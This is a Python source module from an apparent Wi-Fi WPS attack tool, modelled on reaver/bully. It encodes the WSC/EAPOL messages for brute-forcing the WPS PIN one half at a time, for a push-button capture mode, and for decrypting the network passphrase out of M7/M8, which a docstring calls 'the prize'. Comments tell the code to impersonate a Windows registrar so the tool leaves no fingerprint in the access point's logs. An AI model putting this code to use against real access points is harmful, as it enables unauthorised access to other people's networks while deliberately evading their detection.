"""WSC message codec + EAP/EAPOL/WFA wire framing.

Builds the registrar-side messages (M2/M4/M6/WSC_NACK) and parses the
enrollee-side ones (identity request, M1/M3/M5/M7, NACK, EAP-FAIL) the way
reaver/bully/hostapd put them on the wire.

Framing (reaver ``src/builder.c``; struct layouts ``defs.h``):

    802.11 data hdr (ToDS) │ LLC/SNAP …88 8e │ 802.1X │ EAP │ EAP-Expanded(WFA) │ WSC TLVs

    LLC/SNAP : AA AA 03 00 00 00 88 8E
    802.1X   : version(1)=01  type(1)  length(2 BE)        type 1=EAPOL-Start, 0=EAP-Packet
    EAP      : code(1)  id(1)  length(2 BE)  type(1)        code 1=Request 2=Response, type 254=Expanded
    Expanded : vendor-id(3)=00 37 2A  vendor-type(4)=00 00 00 01  op-code(1)  flags(1)
    WSC      : 2-byte BE attr id │ 2-byte BE len │ value …

A WSC "message" (what the Authenticator HMACs as M_prev/M_curr) is the WSC TLV
byte string only — Version TLV onward, excluding the EAP/WFA headers.
"""

from __future__ import annotations

import os
import struct
from dataclasses import dataclass, field
from typing import Dict, Optional

from . import crypto as wc

# ---- WSC attribute IDs (hostapd enum wps_attribute) -----------------------
ATTR_AP_CHANNEL = 0x1001
ATTR_ASSOC_STATE = 0x1002
ATTR_AUTH_TYPE = 0x1003
ATTR_AUTH_TYPE_FLAGS = 0x1004
ATTR_AUTHENTICATOR = 0x1005
ATTR_CONFIG_METHODS = 0x1008
ATTR_CONFIG_ERROR = 0x1009
ATTR_CONN_TYPE_FLAGS = 0x100D
ATTR_ENCR_TYPE = 0x100F
ATTR_ENCR_TYPE_FLAGS = 0x1010
ATTR_DEV_NAME = 0x1011
ATTR_DEV_PASSWORD_ID = 0x1012
ATTR_E_HASH1 = 0x1014
ATTR_E_HASH2 = 0x1015
ATTR_E_SNONCE1 = 0x1016
ATTR_E_SNONCE2 = 0x1017
ATTR_ENCR_SETTINGS = 0x1018
ATTR_ENROLLEE_NONCE = 0x101A
ATTR_KEY_WRAP_AUTH = 0x101E
ATTR_MAC_ADDR = 0x1020
ATTR_MANUFACTURER = 0x1021
ATTR_MSG_TYPE = 0x1022
ATTR_MODEL_NAME = 0x1023
ATTR_MODEL_NUMBER = 0x1024
ATTR_NETWORK_INDEX = 0x1026
ATTR_NETWORK_KEY = 0x1027
ATTR_NETWORK_KEY_INDEX = 0x1028
ATTR_PUBLIC_KEY = 0x1032
ATTR_REGISTRAR_NONCE = 0x1039
ATTR_RF_BANDS = 0x103C
ATTR_R_HASH1 = 0x103D
ATTR_R_HASH2 = 0x103E
ATTR_R_SNONCE1 = 0x103F
ATTR_R_SNONCE2 = 0x1040
ATTR_SERIAL_NUMBER = 0x1042
ATTR_SSID = 0x1045
ATTR_UUID_R = 0x1048
ATTR_VERSION = 0x104A
ATTR_PRIMARY_DEV_TYPE = 0x1054
ATTR_OS_VERSION = 0x102D
ATTR_UUID_E = 0x1047
ATTR_WPS_STATE = 0x1044
ATTR_CRED = 0x100E              # Credential (nested TLV blob, carried in M8)

# ---- WSC message types (ATTR_MSG_TYPE values) -----------------------------
WPS_M1 = 0x04
WPS_M2 = 0x05
WPS_M2D = 0x06
WPS_M3 = 0x07
WPS_M4 = 0x08
WPS_M5 = 0x09
WPS_M6 = 0x0A
WPS_M7 = 0x0B
WPS_M8 = 0x0C
WPS_WSC_ACK = 0x0D
WPS_WSC_NACK = 0x0E
WPS_WSC_DONE = 0x0F

# ---- EAP-WSC op-codes (eap_defs enum wsc_op_code) -------------------------
WSC_START = 0x01
WSC_ACK = 0x02
WSC_NACK = 0x03
WSC_MSG = 0x04
WSC_DONE = 0x05
WSC_FRAG_ACK = 0x06

# Device Password ID
DEV_PW_DEFAULT = 0x0000
DEV_PW_PUSHBUTTON = 0x0004     # PBC; the device password is the fixed "00000000"
PBC_PASSWORD = "00000000"      # hostapd eap_wsc: os_memset(dev_password,'0',8)

# ---- EAP / 802.1X constants -----------------------------------------------
EAP_REQUEST = 1
EAP_RESPONSE = 2
EAP_SUCCESS = 3
EAP_FAILURE = 4
EAP_TYPE_IDENTITY = 0x01
EAP_TYPE_EXPANDED = 0xFE
DOT1X_VERSION = 0x01
DOT1X_TYPE_EAP_PACKET = 0x00
DOT1X_TYPE_EAPOL_START = 0x01

WFA_VENDOR_ID = b"\x00\x37\x2a"
WFA_VENDOR_TYPE_SIMPLECONFIG = b"\x00\x00\x00\x01"
_LLC_SNAP_EAPOL = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"

WPS_VERSION = 0x10
REGISTRAR_IDENTITY = b"WFA-SimpleConfig-Registrar-1-0"
ENROLLEE_IDENTITY = b"WFA-SimpleConfig-Enrollee-1-0"

# ---- Registrar device descriptor -------------------------------------------
# These TLVs are cosmetic to the protocol (APs don't validate them) but they
# ARE visible to the AP and surface in its WPS logs / admin UI as "the device
# that paired". So they MUST NOT fingerprint the tool — we impersonate a generic
# Windows registrar (Manufacturer "Microsoft" / Model "Windows", a Computer/PC
# primary device type), exactly the blend reaver uses, because a Windows machine
# doing WPS is the most ordinary thing on the air. NEVER advertise "wifit3" here.
_MANUFACTURER = b"Microsoft"
_MODEL_NAME = b"Windows"
_MODEL_NUMBER = b"10.0"
_SERIAL_NUMBER = b"12345678"
_DEVICE_NAME = b"DESKTOP-7H2K9P3"   # Windows-default-style hostname
_AUTH_TYPE_FLAGS = 0x003F          # WPS_AUTH_TYPES (open|wpapsk|shared|wpa|wpa2|wpa2psk)
_ENCR_TYPE_FLAGS = 0x000F          # WPS_ENCR_TYPES (none|wep|tkip|aes)
_CONN_TYPE_ESS = 0x01
_CONFIG_METHODS = 0x0084           # Label | Display
_PRIMARY_DEV_TYPE = bytes.fromhex("00010050f2040001")   # Computer / WFA / PC
_RF_BANDS = 0x01                   # 2.4 GHz
_OS_VERSION = 0x80000000


# ---------------------------------------------------------------------------
# TLV primitives
# ---------------------------------------------------------------------------
def tlv(attr_id: int, value: bytes) -> bytes:
    return struct.pack(">HH", attr_id, len(value)) + value


def tlv_u8(attr_id: int, value: int) -> bytes:
    return tlv(attr_id, bytes([value & 0xFF]))


def tlv_u16(attr_id: int, value: int) -> bytes:
    return tlv(attr_id, struct.pack(">H", value & 0xFFFF))


def parse_tlvs(data: bytes) -> Dict[int, bytes]:
    """Walk WSC TLVs into {attr_id: value}. Repeated attrs keep the last."""
    out: Dict[int, bytes] = {}
    i, n = 0, len(data)
    while i + 4 <= n:
        attr, ln = struct.unpack(">HH", data[i : i + 4])
        i += 4
        if i + ln > n:
            break
        out[attr] = data[i : i + ln]
        i += ln
    return out


def _device_attrs() -> bytes:
    return (
        tlv(ATTR_MANUFACTURER, _MANUFACTURER)
        + tlv(ATTR_MODEL_NAME, _MODEL_NAME)
        + tlv(ATTR_MODEL_NUMBER, _MODEL_NUMBER)
        + tlv(ATTR_SERIAL_NUMBER, _SERIAL_NUMBER)
        + tlv(ATTR_PRIMARY_DEV_TYPE, _PRIMARY_DEV_TYPE)
        + tlv(ATTR_DEV_NAME, _DEVICE_NAME)
    )


# ---------------------------------------------------------------------------
# Registrar message builders — return WSC attribute bytes (Version TLV onward)
# ---------------------------------------------------------------------------
def _version_and_type(msg_type: int) -> bytes:
    return tlv_u8(ATTR_VERSION, WPS_VERSION) + tlv_u8(ATTR_MSG_TYPE, msg_type)


def build_m2(
    nonce_e: bytes,
    nonce_r: bytes,
    uuid_r: bytes,
    pkr: bytes,
    authkey: bytes,
    m1_attrs: bytes,
    dev_pw_id: int = 0x0000,
) -> bytes:
    """M2 (hostapd ``wps_build_m2`` attribute order). Authenticator over M1||M2*."""
    body = (
        _version_and_type(WPS_M2)
        + tlv(ATTR_ENROLLEE_NONCE, nonce_e)
        + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
        + tlv(ATTR_UUID_R, uuid_r)
        + tlv(ATTR_PUBLIC_KEY, pkr)
        + tlv_u16(ATTR_AUTH_TYPE_FLAGS, _AUTH_TYPE_FLAGS)
        + tlv_u16(ATTR_ENCR_TYPE_FLAGS, _ENCR_TYPE_FLAGS)
        + tlv_u8(ATTR_CONN_TYPE_FLAGS, _CONN_TYPE_ESS)
        + tlv_u16(ATTR_CONFIG_METHODS, _CONFIG_METHODS)
        + _device_attrs()
        + tlv_u8(ATTR_RF_BANDS, _RF_BANDS)
        + tlv_u16(ATTR_ASSOC_STATE, 0x0000)
        + tlv_u16(ATTR_CONFIG_ERROR, 0x0000)
        + tlv_u16(ATTR_DEV_PASSWORD_ID, dev_pw_id)
        + tlv(ATTR_OS_VERSION, struct.pack(">I", _OS_VERSION))
    )
    auth = wc.authenticator(authkey, m1_attrs, body)
    return body + tlv(ATTR_AUTHENTICATOR, auth)


def _encr_settings(authkey: bytes, keywrapkey: bytes, inner: bytes) -> bytes:
    """ENCR_SETTINGS value = IV(16) || AES-128-CBC(KeyWrapKey, IV, pad(inner||KWA))."""
    kwa = wc.key_wrap_authenticator(authkey, inner)
    plain = wc.pkcs5_pad(inner + tlv(ATTR_KEY_WRAP_AUTH, kwa))
    iv = os.urandom(16)
    return iv + wc.aes128_cbc_encrypt(keywrapkey, iv, plain)


def build_m4(
    nonce_e: bytes,
    r_s1: bytes,
    r_s2: bytes,
    psk1: bytes,
    psk2: bytes,
    pke: bytes,
    pkr: bytes,
    authkey: bytes,
    keywrapkey: bytes,
    m3_attrs: bytes,
) -> bytes:
    """M4: commits R-Hash1=H(R-S1||PSK1||..), R-Hash2=H(R-S2||PSK2||..) and
    reveals R-S1 in the Encrypted Settings. Authenticator over M3||M4*.

    The enrollee decrypts R-S1 and recomputes R-Hash1 with ITS real PSK1; if our
    guessed first-half PSK1 matches, it proceeds to M5, else NACK: that M5-vs-NACK
    reply decides the first half. ``r_s2`` here MUST be the same nonce
    later revealed in M6 (R-Hash2 commits to it).
    """
    r_hash1 = wc.e_or_r_hash(authkey, r_s1, psk1, pke, pkr)
    r_hash2 = wc.e_or_r_hash(authkey, r_s2, psk2, pke, pkr)
    body = (
        _version_and_type(WPS_M4)
        + tlv(ATTR_ENROLLEE_NONCE, nonce_e)
        + tlv(ATTR_R_HASH1, r_hash1)
        + tlv(ATTR_R_HASH2, r_hash2)
        + tlv(ATTR_ENCR_SETTINGS, _encr_settings(authkey, keywrapkey, tlv(ATTR_R_SNONCE1, r_s1)))
    )
    auth = wc.authenticator(authkey, m3_attrs, body)
    return body + tlv(ATTR_AUTHENTICATOR, auth)


def build_m6(
    nonce_e: bytes,
    r_s2: bytes,
    authkey: bytes,
    keywrapkey: bytes,
    m5_attrs: bytes,
) -> bytes:
    """M6: ENC{R-S2}. Authenticator over M5||M6*."""
    body = (
        _version_and_type(WPS_M6)
        + tlv(ATTR_ENROLLEE_NONCE, nonce_e)
        + tlv(ATTR_ENCR_SETTINGS, _encr_settings(authkey, keywrapkey, tlv(ATTR_R_SNONCE2, r_s2)))
    )
    auth = wc.authenticator(authkey, m5_attrs, body)
    return body + tlv(ATTR_AUTHENTICATOR, auth)


def build_wsc_nack(nonce_e: bytes, nonce_r: bytes, config_error: int = 0) -> bytes:
    return (
        _version_and_type(WPS_WSC_NACK)
        + tlv(ATTR_ENROLLEE_NONCE, nonce_e)
        + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
        + tlv_u16(ATTR_CONFIG_ERROR, config_error)
    )


# ---------------------------------------------------------------------------
# Enrollee message builders (PBC capture: we're the Enrollee; AP = Registrar).
# Mirror hostapd wps_build_m1/m3/m5/m7. PSK1/PSK2 come from PBC_PASSWORD.
# ---------------------------------------------------------------------------
def build_m1(uuid_e: bytes, mac_e: bytes, nonce_e: bytes, pke: bytes,
             dev_pw_id: int = DEV_PW_PUSHBUTTON) -> bytes:
    """M1 (hostapd wps_build_m1 order). No Authenticator — keys don't exist yet."""
    return (
        _version_and_type(WPS_M1)
        + tlv(ATTR_UUID_E, uuid_e)
        + tlv(ATTR_MAC_ADDR, mac_e)
        + tlv(ATTR_ENROLLEE_NONCE, nonce_e)
        + tlv(ATTR_PUBLIC_KEY, pke)
        + tlv_u16(ATTR_AUTH_TYPE_FLAGS, _AUTH_TYPE_FLAGS)
        + tlv_u16(ATTR_ENCR_TYPE_FLAGS, _ENCR_TYPE_FLAGS)
        + tlv_u8(ATTR_CONN_TYPE_FLAGS, _CONN_TYPE_ESS)
        + tlv_u16(ATTR_CONFIG_METHODS, _CONFIG_METHODS)
        + tlv_u8(ATTR_WPS_STATE, 1)                # 1 = unconfigured
        + _device_attrs()
        + tlv_u8(ATTR_RF_BANDS, _RF_BANDS)
        + tlv_u16(ATTR_ASSOC_STATE, 0x0000)
        + tlv_u16(ATTR_DEV_PASSWORD_ID, dev_pw_id)
        + tlv_u16(ATTR_CONFIG_ERROR, 0x0000)
        + tlv(ATTR_OS_VERSION, struct.pack(">I", _OS_VERSION))
    )


def build_m3_enrollee(nonce_r: bytes, e_s1: bytes, e_s2: bytes, psk1: bytes,
                      psk2: bytes, pke: bytes, pkr: bytes, authkey: bytes,
                      m2_attrs: bytes) -> bytes:
    """M3: E-Hash1/2 committing to our secret nonces. Authenticator over M2||M3."""
    body = (
        _version_and_type(WPS_M3)
        + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
        + tlv(ATTR_E_HASH1, wc.e_or_r_hash(authkey, e_s1, psk1, pke, pkr))
        + tlv(ATTR_E_HASH2, wc.e_or_r_hash(authkey, e_s2, psk2, pke, pkr))
    )
    return body + tlv(ATTR_AUTHENTICATOR, wc.authenticator(authkey, m2_attrs, body))


def build_m5_enrollee(nonce_r: bytes, e_s1: bytes, authkey: bytes,
                      keywrapkey: bytes, m4_attrs: bytes) -> bytes:
    """M5: reveal E-S1 (encrypted). Authenticator over M4||M5."""
    body = (
        _version_and_type(WPS_M5)
        + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
        + tlv(ATTR_ENCR_SETTINGS, _encr_settings(authkey, keywrapkey, tlv(ATTR_E_SNONCE1, e_s1)))
    )
    return body + tlv(ATTR_AUTHENTICATOR, wc.authenticator(authkey, m4_attrs, body))


def build_m7_enrollee(nonce_r: bytes, e_s2: bytes, authkey: bytes,
                      keywrapkey: bytes, m6_attrs: bytes) -> bytes:
    """M7: reveal E-S2 (encrypted). Authenticator over M6||M7. (Enrollee receiving
    config sends no AP settings here.)"""
    body = (
        _version_and_type(WPS_M7)
        + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
        + tlv(ATTR_ENCR_SETTINGS, _encr_settings(authkey, keywrapkey, tlv(ATTR_E_SNONCE2, e_s2)))
    )
    return body + tlv(ATTR_AUTHENTICATOR, wc.authenticator(authkey, m6_attrs, body))


def build_wsc_done(nonce_e: bytes, nonce_r: bytes) -> bytes:
    return (
        _version_and_type(WPS_WSC_DONE)
        + tlv(ATTR_ENROLLEE_NONCE, nonce_e)
        + tlv(ATTR_REGISTRAR_NONCE, nonce_r)
    )


def extract_m8_credentials(
    encr_settings_value: bytes, keywrapkey: bytes
) -> Optional[Dict[str, bytes]]:
    """Decrypt M8's Encrypted Settings → the AP's Credential → {ssid, network_key}.

    Unlike M7-to-a-registrar (flat AP settings), M8 wraps the config in a nested
    ``ATTR_CRED`` TLV blob whose sub-TLVs hold SSID + Network Key (the PSK).
    """
    if len(encr_settings_value) < 32 or len(encr_settings_value) % 16:
        return None
    iv, ct = encr_settings_value[:16], encr_settings_value[16:]
    plain = wc.pkcs5_unpad(wc.aes128_cbc_decrypt(keywrapkey, iv, ct))
    cred = parse_tlvs(plain).get(ATTR_CRED)
    if cred is None:
        return None
    inner = parse_tlvs(cred)
    out: Dict[str, bytes] = {}
    if ATTR_SSID in inner:
        out["ssid"] = inner[ATTR_SSID]
    if ATTR_NETWORK_KEY in inner:
        out["network_key"] = inner[ATTR_NETWORK_KEY]
    return out


# ---------------------------------------------------------------------------
# EAP / 802.1X framing — return the 802.1X payload (after LLC/SNAP)
# ---------------------------------------------------------------------------
def eapol_start() -> bytes:
    return struct.pack(">BBH", DOT1X_VERSION, DOT1X_TYPE_EAPOL_START, 0)


def _eapol_eap(eap_code: int, eap_id: int, eap_body: bytes) -> bytes:
    """Wrap an EAP body (type byte onward) in EAP + 802.1X headers."""
    eap_len = 4 + len(eap_body)                       # code+id+len(2) + body
    eap = struct.pack(">BBH", eap_code, eap_id, eap_len) + eap_body
    return struct.pack(">BBH", DOT1X_VERSION, DOT1X_TYPE_EAP_PACKET, len(eap)) + eap


def eap_identity_response(eap_id: int, identity: bytes = REGISTRAR_IDENTITY) -> bytes:
    return _eapol_eap(EAP_RESPONSE, eap_id, bytes([EAP_TYPE_IDENTITY]) + identity)


def eap_wsc_response(eap_id: int, opcode: int, wsc_attrs: bytes) -> bytes:
    expanded = (
        bytes([EAP_TYPE_EXPANDED])
        + WFA_VENDOR_ID
        + WFA_VENDOR_TYPE_SIMPLECONFIG
        + bytes([opcode, 0x00])                       # op-code, flags (no fragmentation)
        + wsc_attrs
    )
    return _eapol_eap(EAP_RESPONSE, eap_id, expanded)


# ---------------------------------------------------------------------------
# 802.11 data-frame wrapper
# ---------------------------------------------------------------------------
def build_data_frame(bssid: bytes, src: bytes, dst: bytes, payload_1x: bytes) -> bytes:
    """A non-QoS data frame (ToDS) carrying an 802.1X payload to the AP."""
    fc = b"\x08\x01"                                  # data, ToDS=1
    hdr = fc + b"\x00\x00" + bssid + src + dst + b"\x00\x00"   # Addr1=BSSID, Addr2=SA, Addr3=DA, seq
    return hdr + _LLC_SNAP_EAPOL + payload_1x


# ---------------------------------------------------------------------------
# RX parsing
# ---------------------------------------------------------------------------
@dataclass
class ParsedEap:
    eap_code: int
    eap_id: int
    eap_type: int = 0
    is_identity_request: bool = False
    is_eap_failure: bool = False
    wsc_opcode: int = 0
    wsc_msg_type: int = 0
    attrs: Dict[int, bytes] = field(default_factory=dict)
    raw_wsc_attrs: bytes = b""                         # for the next Authenticator


def _find_eapol(frame: bytes) -> Optional[int]:
    """Offset of the 802.1X header after the 802.11 hdr + LLC/SNAP, or None."""
    # MAC header is 24 (or 26 w/ QoS); SNAP may sit at +24 or +26. Slide a window.
    sig = _LLC_SNAP_EAPOL
    idx = frame.find(sig, 22, 40)
    if idx < 0:
        return None
    return idx + len(sig)


def parse_rx_frame(frame: bytes) -> Optional[ParsedEap]:
    """Parse an RX 802.11 frame into EAP/WSC structure, or None if not EAPOL."""
    pos = _find_eapol(frame)
    if pos is None or pos + 4 > len(frame):
        return None
    _ver, x_type, _x_len = struct.unpack(">BBH", frame[pos : pos + 4])
    if x_type != DOT1X_TYPE_EAP_PACKET:
        return None
    e = pos + 4
    if e + 4 > len(frame):
        return None
    code, eap_id, eap_len = struct.unpack(">BBH", frame[e : e + 4])
    if code in (EAP_SUCCESS, EAP_FAILURE):
        return ParsedEap(eap_code=code, eap_id=eap_id, is_eap_failure=(code == EAP_FAILURE))
    if e + 5 > len(frame):
        return ParsedEap(eap_code=code, eap_id=eap_id)
    # WSC is parsed for Requests (AP→us, the live path) AND Responses (so the
    # in-process fake enrollee can read our M2/M4/M6). The live RX adapter
    # filters to source==BSSID so we never act on our own echoed TX.
    eap_type = frame[e + 4]
    if eap_type == EAP_TYPE_IDENTITY:
        return ParsedEap(eap_code=code, eap_id=eap_id, eap_type=eap_type,
                         is_identity_request=(code == EAP_REQUEST))
    if eap_type != EAP_TYPE_EXPANDED:
        return ParsedEap(eap_code=code, eap_id=eap_id, eap_type=eap_type)
    # Expanded: type(1) vendor-id(3) vendor-type(4) opcode(1) flags(1) attrs…
    exp = e + 5
    if exp + 8 > len(frame):
        return None
    vendor_id = frame[exp : exp + 3]
    vendor_type = frame[exp + 3 : exp + 7]
    opcode = frame[exp + 7]
    if vendor_id != WFA_VENDOR_ID or vendor_type != WFA_VENDOR_TYPE_SIMPLECONFIG:
        return None
    attrs_start = exp + 9                              # skip opcode + flags
    # Bound the WSC message by the EAP length field, NOT the end of the frame.
    # The EAP length is authoritative for what the AP signed into the next
    # Authenticator HMAC (HMAC(authkey, M_prev ‖ M_curr) covers the raw WSC
    # bytes). Trusting frame end instead would let any trailing junk
    # (chip-side padding, future hardware metadata) poison the HMAC; the EAP
    # packet spans [e, e+eap_len), so we slice there.
    attrs_end = e + eap_len
    if not (attrs_start <= attrs_end <= len(frame)):
        attrs_end = len(frame)
    raw_attrs = frame[attrs_start:attrs_end]
    attrs = parse_tlvs(raw_attrs)
    msg_type = attrs.get(ATTR_MSG_TYPE, b"\x00")[0]
    return ParsedEap(
        eap_code=code, eap_id=eap_id, eap_type=eap_type,
        wsc_opcode=opcode, wsc_msg_type=msg_type, attrs=attrs, raw_wsc_attrs=raw_attrs,
    )


def extract_m7_credentials(
    encr_settings_value: bytes, keywrapkey: bytes
) -> Optional[Dict[str, bytes]]:
    """Decrypt M7's Encrypted Settings (AP's config) → flat AP-settings TLVs.

    Returns {ssid, network_key, ...} or None if decryption is malformed.
    The Network Key is the WPA passphrase/PSK — the prize.
    """
    if len(encr_settings_value) < 32 or len(encr_settings_value) % 16:
        return None
    iv, ct = encr_settings_value[:16], encr_settings_value[16:]
    plain = wc.pkcs5_unpad(wc.aes128_cbc_decrypt(keywrapkey, iv, ct))
    attrs = parse_tlvs(plain)
    out: Dict[str, bytes] = {}
    if ATTR_SSID in attrs:
        out["ssid"] = attrs[ATTR_SSID]
    if ATTR_NETWORK_KEY in attrs:
        out["network_key"] = attrs[ATTR_NETWORK_KEY]
    if ATTR_MAC_ADDR in attrs:
        out["mac_addr"] = attrs[ATTR_MAC_ADDR]
    return out
